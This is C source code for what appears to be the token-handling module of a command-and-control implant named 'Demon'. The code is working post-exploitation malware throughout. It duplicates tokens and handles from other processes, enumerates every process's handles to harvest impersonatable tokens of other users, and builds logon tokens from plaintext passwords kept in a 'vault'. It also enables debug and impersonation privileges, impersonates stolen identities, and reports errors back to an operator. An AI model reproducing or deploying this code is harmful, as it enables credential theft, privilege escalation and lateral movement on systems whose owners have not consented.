#include <Demon.h>

#include <Common/Macros.h>

#include <Core/Token.h>
#include <Core/WinUtils.h>
#include <Core/Win32.h>
#include <Core/Package.h>
#include <Core/MiniStd.h>

#include <ntstatus.h>

/* TODO: Change the way new tokens gets added.
 *
 * Instead of appending it to the newest token like:
 * TokenNew->Next = Token
 *
 * Add it to the first token (parent):
 *
 * Token->Next            = Instance.Tokens.Vault;
 * Instance.Tokens.Vault = Token;
 *
 * Might reduce some code which i care more than
 * token order.
 * */

BOOL TokenSetPrivilege( LPSTR Privilege, BOOL Enable )
{
    TOKEN_PRIVILEGES TokenPrivileges = { 0 };
    LUID             TokenLUID       = { 0 };
    NTSTATUS         NtStatus        = STATUS_SUCCESS;
    HANDLE           hToken          = NULL;

    if ( ! Instance.Win32.LookupPrivilegeValueA( NULL, Privilege, &TokenLUID ) )
    {
        PRINTF( "[-] LookupPrivilegeValue error: %u\n", NtGetLastError() );
        return FALSE;
    }

    TokenPrivileges.PrivilegeCount       = 1;
    TokenPrivileges.Privileges[ 0 ].Luid = TokenLUID;

    if ( Enable )
        TokenPrivileges.Privileges[ 0 ].Attributes = SE_PRIVILEGE_ENABLED;
    else
        TokenPrivileges.Privileges[ 0 ].Attributes = 0;

    NtStatus = Instance.Syscall.NtOpenProcessToken( NtCurrentProcess( ), TOKEN_ALL_ACCESS, &hToken );
    if ( NT_SUCCESS( NtStatus ) )
    {
        if ( ! Instance.Win32.AdjustTokenPrivileges( hToken, FALSE, &TokenPrivileges, 0, NULL, NULL ) )
        {
            PRINTF( "[-] AdjustTokenPrivileges error: %u\n", NtGetLastError() );
            return FALSE;
        }
    }
    else
    {
        PRINTF( "NtOpenProcessToken: Failed [%d]", Instance.Win32.RtlNtStatusToDosError( NtStatus ) )
        PackageTransmitError( CALLBACK_ERROR_WIN32, Instance.Win32.RtlNtStatusToDosError( NtStatus ) );
        return FALSE;
    }

    return TRUE;
}

DWORD TokenAdd( HANDLE hToken, LPWSTR DomainUser, SHORT Type, DWORD dwProcessID, LPWSTR User, LPWSTR Domain, LPWSTR Password )
{
    PTOKEN_LIST_DATA TokenList   = NULL;
    PTOKEN_LIST_DATA TokenEntry  = NULL;
    DWORD            TokenIndex  = 0;

    TokenEntry              = Instance.Win32.LocalAlloc( LPTR, sizeof( TOKEN_LIST_DATA ) );
    TokenEntry->Handle      = hToken;
    TokenEntry->DomainUser  = DomainUser;
    TokenEntry->dwProcessID = dwProcessID;
    TokenEntry->Type        = Type;
    TokenEntry->lpUser      = User;
    TokenEntry->lpDomain    = Domain;
    TokenEntry->lpPassword  = Password;
    TokenEntry->NextToken   = NULL;

    if ( Instance.Tokens.Vault == NULL )
    {
        Instance.Tokens.Vault = TokenEntry;
        return TokenIndex;
    }

    TokenList = Instance.Tokens.Vault;

    // add TokenEntry to Token linked list
    while ( TokenList->NextToken != NULL )
    {
        TokenList = TokenList->NextToken;
        TokenIndex++;
    }

    TokenList->NextToken = TokenEntry;
    TokenIndex++;

    return TokenIndex;
}

HANDLE TokenSteal( DWORD ProcessID, HANDLE TargetHandle )
{
    HANDLE            hProcess  = NULL;
    HANDLE            hToken    = NULL;
    HANDLE            hTokenDup = NULL;
    NTSTATUS          NtStatus  = STATUS_SUCCESS;
    CLIENT_ID         ProcID    = { 0 };
    OBJECT_ATTRIBUTES ObjAttr   = { sizeof( ObjAttr ) };

    if ( TargetHandle )
    {
        PRINTF( "Stealing handle 0x%x from PID %d\n", TargetHandle, ProcessID );
        ProcID.UniqueProcess = ( HANDLE ) ProcessID;
        NtStatus = Instance.Syscall.NtOpenProcess( &hProcess, PROCESS_DUP_HANDLE, &ObjAttr, &ProcID );
        if ( NT_SUCCESS( NtStatus ) )
        {
            NtStatus = Instance.Syscall.NtDuplicateObject( hProcess, TargetHandle, NtCurrentProcess( ), &hTokenDup, 0, 0, DUPLICATE_SAME_ACCESS );
            if ( ! NT_SUCCESS( NtStatus ) )
            {
                PRINTF( "NtDuplicateObject: Failed:[%ld : %ld]", NtStatus, Instance.Win32.RtlNtStatusToDosError( NtStatus ) )
                PackageTransmitError( CALLBACK_ERROR_WIN32, Instance.Win32.RtlNtStatusToDosError( NtStatus ) );
            }
        }
        else
        {
            PRINTF( "NtOpenProcess: Failed:[%ld : %ld]", NtStatus, Instance.Win32.RtlNtStatusToDosError( NtStatus ) )
            PackageTransmitError( CALLBACK_ERROR_WIN32, Instance.Win32.RtlNtStatusToDosError( NtStatus ) );
        }
    }
    else
    {
        PRINTF( "Stealing process handle from PID %d\n", ProcessID );
        hProcess = ProcessOpen( ProcessID, PROCESS_QUERY_LIMITED_INFORMATION );
        if ( hProcess )
        {
            if ( NT_SUCCESS( NtStatus = Instance.Syscall.NtOpenProcessToken( hProcess, TOKEN_QUERY | TOKEN_DUPLICATE | TOKEN_IMPERSONATE, &hToken ) ) )
            {
                if ( ! Win32_DuplicateTokenEx(
                            hToken,
                            TOKEN_ADJUST_DEFAULT | TOKEN_ADJUST_SESSIONID | TOKEN_QUERY | TOKEN_DUPLICATE | TOKEN_ASSIGN_PRIMARY,
                            NULL,
                            SecurityImpersonation | SecurityIdentification, TokenPrimary, &hTokenDup
                        )
                    )
                {
                    PRINTF( "[!] DuplicateTokenEx() error : % u\n", NtGetLastError()) ;
                    CALLBACK_GETLASTERROR
                }
                else PRINTF( "Successful duplicated token: %x\n", hToken )
            }
            else
            {
                PRINTF( "NtOpenProcessToken: Failed:[%ld : %ld]", NtStatus, Instance.Win32.RtlNtStatusToDosError( NtStatus ) )
                PackageTransmitError( CALLBACK_ERROR_WIN32, Instance.Win32.RtlNtStatusToDosError( NtStatus ) );
            }
        }
        else
        {
            PRINTF( "ProcessOpen: Failed:[%ld]\n", NtGetLastError() )
            PackageTransmitError( CALLBACK_ERROR_WIN32, NtGetLastError() );
        }
    }

    if ( hToken )
        Instance.Win32.NtClose( hToken );

    if ( hProcess )
        Instance.Win32.NtClose( hProcess );

    return hTokenDup;
}

BOOL TokenRemove( DWORD TokenID )
{
    PRINTF( "Token Remove => %d\n", TokenID )

    PTOKEN_LIST_DATA TokenList  = NULL;
    PTOKEN_LIST_DATA TokenItem  = NULL;

    TokenItem = TokenGet( TokenID );
    TokenList = Instance.Tokens.Vault;

    if ( ( ! TokenList ) || ( ! TokenItem ) )
        return FALSE;

    if ( Instance.Tokens.Vault == TokenItem )
    {
        PUTS( "Its first item" )
        TokenItem = Instance.Tokens.Vault->NextToken;

        if ( Instance.Tokens.Impersonate && Instance.Tokens.Token->Handle == Instance.Tokens.Vault->Handle )
            TokenImpersonate( FALSE );

        if ( Instance.Tokens.Vault->Handle )
        {
            Instance.Win32.NtClose( Instance.Tokens.Vault->Handle );
            Instance.Tokens.Vault->Handle = NULL;
        }

        if ( Instance.Tokens.Vault->DomainUser )
        {
            MemSet( Instance.Tokens.Vault->DomainUser, 0, StringLengthW( Instance.Tokens.Vault->DomainUser ) * sizeof( WCHAR ) );
            Instance.Win32.LocalFree( Instance.Tokens.Vault->DomainUser );
            Instance.Tokens.Vault->DomainUser = NULL;
        }

        if ( Instance.Tokens.Vault->lpUser )
        {
            MemSet( Instance.Tokens.Vault->lpUser, 0, StringLengthW( Instance.Tokens.Vault->lpUser ) * sizeof( WCHAR ) );
            Instance.Win32.LocalFree( Instance.Tokens.Vault->lpUser );
            Instance.Tokens.Vault->lpUser = NULL;
        }

        if ( Instance.Tokens.Vault->lpDomain )
        {
            MemSet( Instance.Tokens.Vault->lpDomain, 0, StringLengthW( Instance.Tokens.Vault->lpUser ) * sizeof( WCHAR ) );
            Instance.Win32.LocalFree( Instance.Tokens.Vault->lpDomain );
            Instance.Tokens.Vault->lpDomain = NULL;
        }

        if ( Instance.Tokens.Vault->lpPassword )
        {
            MemSet( Instance.Tokens.Vault->lpPassword, 0, StringLengthW( Instance.Tokens.Vault->lpPassword ) * sizeof( WCHAR ) );
            Instance.Win32.LocalFree( Instance.Tokens.Vault->lpPassword );
            Instance.Tokens.Vault->lpPassword = NULL;
        }

        MemSet( Instance.Tokens.Vault, 0, sizeof( TOKEN_LIST_DATA ) );
        Instance.Win32.LocalFree( Instance.Tokens.Vault );

        Instance.Tokens.Vault = TokenItem;

        return TRUE;
    }

    do
    {
        if ( TokenList )
        {
            if ( TokenList->NextToken == TokenItem )
            {
                PUTS( "Found TokenItem" )

                TokenList->NextToken = TokenItem->NextToken;

                if ( Instance.Tokens.Impersonate && Instance.Tokens.Token->Handle == TokenItem->Handle )
                    TokenImpersonate( FALSE );

                if ( TokenItem->Handle )
                {
                    Instance.Win32.NtClose( TokenItem->Handle );
                    TokenItem->Handle = NULL;
                }

                if ( TokenItem->DomainUser )
                {
                    MemSet( TokenItem->DomainUser, 0, StringLengthW( TokenItem->DomainUser ) * sizeof( WCHAR ) );
                    Instance.Win32.LocalFree( TokenItem->DomainUser );
                    TokenItem->DomainUser = NULL;
                }

                if ( TokenItem->lpUser )
                {
                    MemSet( TokenItem->lpUser, 0, StringLengthW( TokenItem->lpUser ) * sizeof( WCHAR ) );
                    Instance.Win32.LocalFree( TokenItem->lpUser );
                    TokenItem->lpUser = NULL;
                }

                if ( TokenItem->lpDomain )
                {
                    MemSet( TokenItem->lpDomain, 0, StringLengthW( TokenItem->lpUser ) * sizeof( WCHAR ) );
                    Instance.Win32.LocalFree( TokenItem->lpDomain );
                    TokenItem->lpDomain = NULL;
                }

                if ( TokenItem->lpPassword )
                {
                    MemSet( TokenItem->lpPassword, 0, StringLengthW( TokenItem->lpPassword ) * sizeof( WCHAR ) );
                    Instance.Win32.LocalFree( TokenItem->lpPassword );
                    TokenItem->lpPassword = NULL;
                }

                MemSet( TokenItem, 0, sizeof( TOKEN_LIST_DATA ) );
                Instance.Win32.LocalFree( TokenItem );
                TokenItem = NULL;

                return TRUE;
            }
            else
                TokenList = TokenList->NextToken;
        }
        else
            return FALSE;
    } while ( TRUE );
}

HANDLE TokenMake( LPWSTR User, LPWSTR Password, LPWSTR Domain )
{
    HANDLE hToken = NULL;

    PRINTF( "TokenMake( %ls, %ls, %ls )\n", User, Password, Domain )

    if ( ! Instance.Win32.RevertToSelf() )
    {
        PRINTF( "Failed to revert to self: Error:[%d]\n", NtGetLastError() )
        CALLBACK_GETLASTERROR
        // TODO: at this point should I return NULL or just continue ? For now i just continue.
    }

    if ( ! Instance.Win32.LogonUserW( User, Domain, Password, LOGON32_LOGON_NEW_CREDENTIALS, LOGON32_PROVIDER_DEFAULT, &hToken ) )
    {
        PUTS( "LogonUserW: Failed" )
        CALLBACK_GETLASTERROR
    }

    return hToken;
}

HANDLE TokenCurrentHandle( )
{
    HANDLE hToken = NULL;

    // TODO: use syscalls
    if ( ! Instance.Win32.OpenThreadToken( NtCurrentThread(), TOKEN_QUERY, FALSE, &hToken ) )
    {
        PRINTF( "OpenThreadToken: Failed:[%d]\n", NtGetLastError() );
        if ( ! Instance.Win32.OpenThreadToken( NtCurrentThread(), TOKEN_QUERY, TRUE, &hToken ) )
        {
            PRINTF( "OpenThreadToken: Failed:[%d]\n", NtGetLastError() );
            if ( ! Instance.Win32.OpenProcessToken( NtCurrentProcess(), TOKEN_QUERY, &hToken ) )
            {
                PRINTF( "OpenProcessToken: Failed:[%d]\n", NtGetLastError() );
                return NULL;
            }
        }
    }

    return hToken;
}

PTOKEN_LIST_DATA TokenGet( DWORD TokenID )
{
    PTOKEN_LIST_DATA TokenList  = Instance.Tokens.Vault;
    DWORD            TokenIndex = 0;

    for (TokenIndex = 0; TokenIndex < TokenID && TokenList && TokenList->NextToken; ++TokenIndex)
        TokenList = TokenList->NextToken;

    if ( TokenIndex != TokenID )
        return NULL;

    return TokenList;
}

VOID TokenClear()
{
    PTOKEN_LIST_DATA TokenList  = Instance.Tokens.Vault;
    DWORD            TokenIndex = 0;

    TokenImpersonate( FALSE );

    do {
        if ( TokenList != NULL )
            TokenList = TokenList->NextToken;
        else
            break;
        TokenIndex++;
    } while ( TRUE );

    for ( int i = 0; i < TokenIndex; i++ )
        TokenRemove( 0 );

    Instance.Tokens.Impersonate = FALSE;
    Instance.Tokens.Vault       = NULL;
    Instance.Tokens.Token       = NULL;
}

BOOL TokenImpersonate( BOOL Impersonate )
{
    if ( Impersonate && ! Instance.Tokens.Impersonate && Instance.Tokens.Token )
    {
        // impersonate the current token.
        if ( Instance.Win32.ImpersonateLoggedOnUser( Instance.Tokens.Token->Handle ) )
            Instance.Tokens.Impersonate = TRUE;
        else
            Instance.Tokens.Impersonate = FALSE;

        return Instance.Tokens.Impersonate;
    }
    else if ( ! Impersonate && Instance.Tokens.Impersonate )
        return Instance.Win32.RevertToSelf(); // stop impersonating
    else if ( Impersonate && ! Instance.Tokens.Token )
        return TRUE; // there is no token to impersonate in the first place
    else if ( Impersonate && Instance.Tokens.Impersonate )
        return TRUE; // we are already impersonating
    else if ( ! Impersonate && ! Instance.Tokens.Impersonate )
        return TRUE; // we are already not impersonating
    return FALSE;
}

LPWSTR GetObjectInfo( HANDLE hObject, OBJECT_INFORMATION_CLASS objInfoClass )
{
    LPWSTR                   data        = NULL;
    DWORD                    dwSize      = sizeof(OBJECT_NAME_INFORMATION);
    POBJECT_NAME_INFORMATION pObjectInfo = NULL;
    NTSTATUS                 status      = STATUS_SUCCESS;

    pObjectInfo = Instance.Win32.LocalAlloc( LPTR, dwSize );
   
    status = Instance.Syscall.NtQueryObject( hObject, objInfoClass, pObjectInfo, dwSize, &dwSize );

    do
    {
        Instance.Win32.LocalFree( pObjectInfo );
        pObjectInfo = Instance.Win32.LocalAlloc( LPTR, dwSize );
        status = Instance.Syscall.NtQueryObject( hObject, objInfoClass, pObjectInfo, dwSize, &dwSize );
    } while ( status == STATUS_INFO_LENGTH_MISMATCH );

    if ( NT_SUCCESS (status) )
    {
        data = Instance.Win32.LocalAlloc( LPTR, pObjectInfo->Name.Length * sizeof( WCHAR ) );
        MemCopy( data, pObjectInfo->Name.Buffer, pObjectInfo->Name.Length * sizeof( WCHAR ) );
        Instance.Win32.LocalFree( pObjectInfo );
        return data;
    }

    Instance.Win32.LocalFree( pObjectInfo );

    return NULL;
}

BOOL IsDelegationToken( HANDLE token )
{
    HANDLE temp_token              = NULL;
    BOOL   ReturnValue             = FALSE;
    LPVOID TokenImpersonationInfo  = NULL;
    DWORD  returned_tokinfo_length = 0;

    TokenImpersonationInfo = Instance.Win32.LocalAlloc( LPTR, BUF_SIZE );
    if ( ! TokenImpersonationInfo )
        return FALSE;

    if ( Instance.Win32.GetTokenInformation( token, TokenImpersonationLevel, TokenImpersonationInfo, BUF_SIZE, &returned_tokinfo_length ) )
    {
        if ( *( ( SECURITY_IMPERSONATION_LEVEL* ) TokenImpersonationInfo ) >= SecurityDelegation )
            ReturnValue = TRUE;
        else
            ReturnValue = FALSE;
    }
    else
    {
        ReturnValue = Win32_DuplicateTokenEx( token, TOKEN_ALL_ACCESS, NULL, SecurityDelegation, TokenImpersonation, &temp_token );
        Instance.Win32.NtClose( temp_token );
    }

    if ( TokenImpersonationInfo )
        Instance.Win32.LocalFree( TokenImpersonationInfo );

    return ReturnValue;
}

BOOL IsImpersonationToken( HANDLE token )
{
    HANDLE temp_token              = NULL;
    BOOL   ReturnValue             = FALSE;
    LPVOID TokenImpersonationInfo  = NULL;
    DWORD  returned_tokinfo_length = 0;

    TokenImpersonationInfo = Instance.Win32.LocalAlloc( LPTR, BUF_SIZE );
    if ( ! TokenImpersonationInfo )
        return FALSE;

    if ( Instance.Win32.GetTokenInformation( token, TokenImpersonationLevel, TokenImpersonationInfo, BUF_SIZE, &returned_tokinfo_length ) )
    {
        if ( *( ( SECURITY_IMPERSONATION_LEVEL* ) TokenImpersonationInfo ) >= SecurityImpersonation )
            ReturnValue = TRUE;
        else
            ReturnValue = FALSE;
    }
    else
    {
        ReturnValue = Win32_DuplicateTokenEx( token, TOKEN_ALL_ACCESS, NULL, SecurityImpersonation, TokenImpersonation, &temp_token );
        Instance.Win32.NtClose( temp_token );
    }

    if ( TokenImpersonationInfo )
        Instance.Win32.LocalFree( TokenImpersonationInfo );

    return ReturnValue;
}

BOOL GetDomainUsernameFromToken(HANDLE token, PCHAR FullName)
{
    LPVOID TokenUserInfo           = NULL;
    LPSTR  username                = NULL;
    LPSTR  domainname              = NULL;
    DWORD  user_length             = BUF_SIZE * sizeof( CHAR );
    DWORD  domain_length           = BUF_SIZE * sizeof( CHAR );
    DWORD  sid_type                = 0;
    DWORD  returned_tokinfo_length = 0;
    BOOL   ReturnValue             = FALSE;

    TokenUserInfo = Instance.Win32.LocalAlloc( LPTR, BUF_SIZE * sizeof(LPVOID) );
    if ( ! TokenUserInfo )
        goto Cleanup;

    username = Instance.Win32.LocalAlloc( LPTR, user_length );
    if ( ! username )
        goto Cleanup;

    domainname = Instance.Win32.LocalAlloc( LPTR, domain_length );
    if ( ! domainname )
        goto Cleanup;

    if ( ! Instance.Win32.GetTokenInformation( token, TokenUser, TokenUserInfo, BUF_SIZE, &returned_tokinfo_length ) )
        goto Cleanup;

    if ( ! Instance.Win32.LookupAccountSidA( NULL, ((TOKEN_USER*)TokenUserInfo)->User.Sid, username, &user_length, domainname, &domain_length, (PSID_NAME_USE)&sid_type ) )
        goto Cleanup;

    // Make full name in DOMAIN\USERNAME format
    StringCopyA( FullName, domainname );
    StringConcatA( FullName, "\\");
    StringConcatA( FullName, username);

    ReturnValue = TRUE;

Cleanup:
    if ( TokenUserInfo )
        Instance.Win32.LocalFree( TokenUserInfo );
    if ( username )
        Instance.Win32.LocalFree( username );
    if ( domainname )
        Instance.Win32.LocalFree( domainname );

    return ReturnValue;
}

VOID ProcessUserToken( PSavedToken SavedToken, PUniqueUserToken UniqTokens, PDWORD NumUniqTokens )
{
    BOOL user_exists = FALSE;

    for ( DWORD i = 0; i < *NumUniqTokens; ++i )
    {
        if ( ! StringCompareA( UniqTokens[i].username,  SavedToken->username) )
        {
            if ( UniqTokens[i].localHandle != 0 && SavedToken->localHandle != 0 )
            {
                user_exists = TRUE;
                break;
            }
            if ( UniqTokens[i].localHandle == 0 && SavedToken->localHandle == 0 )
            {
                user_exists = TRUE;
                break;
            }
        }
    }

    if ( ! user_exists )
    {
        // TODO: while unlikely, this could overflow

        StringCopyA( UniqTokens[ *NumUniqTokens ].username, SavedToken->username );
        UniqTokens[ *NumUniqTokens ].dwProcessID = SavedToken->dwProcessID;
        UniqTokens[ *NumUniqTokens ].localHandle = SavedToken->localHandle;
        UniqTokens[ *NumUniqTokens ].delegation_available    = FALSE;
        UniqTokens[ *NumUniqTokens ].impersonation_available = FALSE;

        if ( IsDelegationToken( SavedToken->token ) )
            UniqTokens[ *NumUniqTokens ].delegation_available = TRUE;
        else if ( IsImpersonationToken( SavedToken->token ) )
            UniqTokens[ *NumUniqTokens ].impersonation_available = TRUE;

        (*NumUniqTokens)++;
    }
}

BOOL ListTokens( PUniqueUserToken* pUniqTokens, PDWORD pNumTokens )
{
    BOOL                        ReturnValue       = FALSE;
    DWORD                       NumTokens         = 0;
    DWORD                       ListSize          = BUF_SIZE;
    PSavedToken                 TokenList         = NULL;
    NTSTATUS                    status            = STATUS_SUCCESS;
    PSYSTEM_PROCESS_INFORMATION pProcessInfoList  = NULL;
    PSYSTEM_PROCESS_INFORMATION pProcessInfoEntry = NULL;
    DWORD                       dwSize            = sizeof(SYSTEM_HANDLE_INFORMATION);
    BOOL                        MoreProcesses     = TRUE;
    HANDLE                      hProcess          = NULL;
    HANDLE                      hObject           = NULL;
    HANDLE                      hObject2          = NULL;
    CLIENT_ID                   ProcID            = { 0 };
    OBJECT_ATTRIBUTES           ObjAttr           = { sizeof( ObjAttr ) };
    LPWSTR                      lpwsType          = NULL;
    PUniqueUserToken            UniqTokens        = NULL;
    DWORD                       NumUniqTokens     = 0;

    UniqTokens = Instance.Win32.LocalAlloc( LPTR, BUF_SIZE * sizeof( UniqueUserToken ) );
    if ( ! UniqTokens )
        goto Cleanup;

    TokenList = Instance.Win32.LocalAlloc( LPTR, ListSize * sizeof( SavedToken ) );
    if ( ! TokenList )
        goto Cleanup;
    
    // we don't care if we don't actually get to enable this privilege
    TokenSetPrivilege( SE_IMPERSONATE_NAME, TRUE );

    pProcessInfoList = Instance.Win32.LocalAlloc( LPTR, dwSize );
    if ( ! pProcessInfoList )
        goto Cleanup;
    
    status = Instance.Syscall.NtQuerySystemInformation( SystemProcessInformation, pProcessInfoList, dwSize, &dwSize );

    while (status == STATUS_INFO_LENGTH_MISMATCH)
    {
        Instance.Win32.LocalFree( pProcessInfoList );
        pProcessInfoList = Instance.Win32.LocalAlloc( LPTR, dwSize );
        if ( ! pProcessInfoList )
            goto Cleanup;
        status = Instance.Syscall.NtQuerySystemInformation(SystemProcessInformation, pProcessInfoList, dwSize, &dwSize);
    }

    if ( ! NT_SUCCESS( status ) )
        goto Cleanup;

    pProcessInfoEntry = pProcessInfoList;

    while ( MoreProcesses )
    {
        if ( pProcessInfoEntry->NextEntryOffset == 0 )
        {
            MoreProcesses = FALSE;
        }

        // ignore our own process
        if ( pProcessInfoEntry->UniqueProcessId != Instance.Teb->ClientId.UniqueProcess )
        {
            ProcID.UniqueProcess = pProcessInfoEntry->UniqueProcessId;
            status = Instance.Syscall.NtOpenProcess( &hProcess, PROCESS_DUP_HANDLE | PROCESS_QUERY_INFORMATION, &ObjAttr, &ProcID );
            if ( NT_SUCCESS( status ) )
            {
                for ( ULONG i = 0; i < pProcessInfoEntry->HandleCount; i++ )
                {
                    hObject = NULL;

                    if ( Instance.Win32.DuplicateHandle( hProcess, (HANDLE)(DWORD_PTR)((i + 1) * 4), NtCurrentProcess(), &hObject, 0, FALSE, DUPLICATE_SAME_ACCESS ) )
                    {
                        lpwsType = GetObjectInfo(hObject, ObjectTypeInformation);
                        if ( lpwsType )
                        {
                            if ( lpwsType[0] == 'T' && lpwsType[1] == 'o' && lpwsType[2] == 'k' && lpwsType[3] == 'e' && lpwsType[4] == 'n' && Instance.Win32.ImpersonateLoggedOnUser( hObject ) )
                            {
                                // ImpersonateLoggedOnUser() always returns true. Need to check whether impersonated token kept impersonate status - failure degrades to identification
                                // also revert to self after getting new token context
                                // only process if it was impersonation or higher
                                if ( Instance.Win32.OpenThreadToken( NtCurrentThread(), TOKEN_QUERY, TRUE, &hObject2 ) )
                                {
                                    Instance.Win32.RevertToSelf();

                                    if ( IsImpersonationToken( hObject2 ) )
                                    {
                                        // Reallocate space if necessary
                                        if ( NumTokens >= ListSize )
                                        {
                                            ListSize *= 2;
                                            TokenList = Instance.Win32.LocalReAlloc(
                                                    TokenList,
                                                    ListSize * sizeof( SavedToken ),
                                                    LMEM_MOVEABLE
                                            );
                                            if ( ! TokenList )
                                                goto Cleanup;
                                        }

                                        if ( GetDomainUsernameFromToken( hObject, TokenList[ NumTokens ].username ) )
                                        {
                                            TokenList[ NumTokens ].token = hObject;
                                            TokenList[ NumTokens ].dwProcessID = ( DWORD ) ( ULONG_PTR ) pProcessInfoEntry->UniqueProcessId;
                                            TokenList[ NumTokens ].localHandle = ( HANDLE ) ( ( i + 1 ) * 4 );
                                            ProcessUserToken( &TokenList[ NumTokens ], UniqTokens, &NumUniqTokens );
                                            NumTokens++;
                                        }
                                        else
                                        {
                                            PUTS("Failed to obtain the username and domain")
                                        }
                                    }
                                    Instance.Win32.NtClose( hObject2 ); hObject2 = NULL;
                                }
                                else
                                {
                                    Instance.Win32.RevertToSelf();
                                }
                            }
                            Instance.Win32.LocalFree( lpwsType ); lpwsType = NULL;
                        }
                        else
                        {
                            Instance.Win32.NtClose( hObject ); hObject = NULL;
                        }
                    }
                }

                // Also process primary
                status = Instance.Syscall.NtOpenProcessToken( hProcess, TOKEN_DUPLICATE | TOKEN_QUERY, &hObject );
                if ( NT_SUCCESS( status ) )
                {
                    if ( Instance.Win32.ImpersonateLoggedOnUser( hObject ) )
                    {
                        if ( Instance.Win32.OpenThreadToken( NtCurrentThread(), TOKEN_QUERY, TRUE, &hObject2 ) )
                        {
                            Instance.Win32.RevertToSelf();

                            if ( IsImpersonationToken( hObject2 ) )
                            {
                                // Reallocate space if necessary
                                if ( NumTokens >= ListSize )
                                {
                                    ListSize *= 2;
                                    TokenList = Instance.Win32.LocalReAlloc(
                                            TokenList,
                                            ListSize * sizeof( SavedToken ),
                                            LMEM_MOVEABLE
                                    );
                                    if ( ! TokenList )
                                        goto Cleanup;
                                }

                                if ( GetDomainUsernameFromToken( hObject, TokenList[ NumTokens ].username ) )
                                {
                                    TokenList[ NumTokens ].token = hObject;
                                    TokenList[ NumTokens ].dwProcessID = ( DWORD ) ( ULONG_PTR ) pProcessInfoEntry->UniqueProcessId;
                                    TokenList[ NumTokens ].localHandle = 0;
                                    ProcessUserToken( &TokenList[ NumTokens ], UniqTokens, &NumUniqTokens );
                                    NumTokens++;
                                }
                            }

                            Instance.Win32.NtClose( hObject2 ); hObject2 = NULL;
                        }
                        else
                        {
                            Instance.Win32.RevertToSelf();
                        }
                    }
                    else
                    {
                        Instance.Win32.NtClose( hObject ); hObject = NULL;
                    }
                }

                Instance.Win32.NtClose( hProcess ); hProcess = NULL;
            }
        }
        pProcessInfoEntry = (PSYSTEM_PROCESS_INFORMATION)((ULONG_PTR)pProcessInfoEntry + (ULONG_PTR)pProcessInfoEntry->NextEntryOffset);
    }

    for (DWORD j = 0; j < NumTokens; ++j)
    {
        Instance.Win32.NtClose( TokenList[ j ].token ); TokenList[ j ].token = NULL;
    }

    Instance.Win32.LocalFree( TokenList ); TokenList = NULL;

    *pUniqTokens = UniqTokens;
    *pNumTokens = NumUniqTokens;
    ReturnValue = TRUE;

Cleanup:
    if ( TokenList )
        Instance.Win32.LocalFree( TokenList );
    if ( ! ReturnValue && UniqTokens )
        Instance.Win32.LocalFree( UniqTokens );
    if ( pProcessInfoList )
        Instance.Win32.LocalFree( pProcessInfoList );

    return ReturnValue;
}

BOOL ImpersonateTokenFromVault( DWORD TokenID )
{
    PTOKEN_LIST_DATA TokenData = NULL;
    BOOL             Success   = FALSE;


    TokenData = TokenGet( TokenID );

    if ( ! TokenData )
    {
        PUTS( "Token not found in vault." )
        PackageTransmitError( CALLBACK_ERROR_TOKEN, 0x1 );
        goto Cleanup;
    }

    if ( ! ImpersonateTokenInStore( TokenData ) )
        goto Cleanup;

    Success = TRUE;

Cleanup:
    return Success;
}

BOOL ImpersonateTokenInStore( PTOKEN_LIST_DATA TokenData )
{
    BOOL Success = FALSE;

    if ( ! TokenData )
        goto Cleanup;

    // if we are already impersonating the selected token, do nothing
    if ( Instance.Tokens.Impersonate && TokenData->Handle == Instance.Tokens.Token->Handle )
        return TRUE;

    if ( ! TokenSetPrivilege( SE_DEBUG_NAME, TRUE ) )
    {
        PUTS( "Could not enable SE_DEBUG_NAME privilege." )
        goto Cleanup;
    }

    if ( ! Instance.Win32.RevertToSelf() )
    {
        CALLBACK_GETLASTERROR
        goto Cleanup;
    }

    if ( Instance.Win32.ImpersonateLoggedOnUser( TokenData->Handle ) )
    {
        Instance.Tokens.Impersonate = TRUE;
        Instance.Tokens.Token       = TokenData;

        PRINTF( "[+] Successfully impersonated: %ls\n", TokenData->DomainUser );
    }
    else
    {
        Instance.Tokens.Impersonate = FALSE;
        Instance.Tokens.Token       = NULL;

        PRINTF( "[!] Failed to impersonate token user: %ls\n", TokenData->DomainUser );

        CALLBACK_GETLASTERROR

        if ( ! Instance.Win32.RevertToSelf() )
            CALLBACK_GETLASTERROR

        goto Cleanup;
    }

    Success = TRUE;

Cleanup:
    return Success;
}
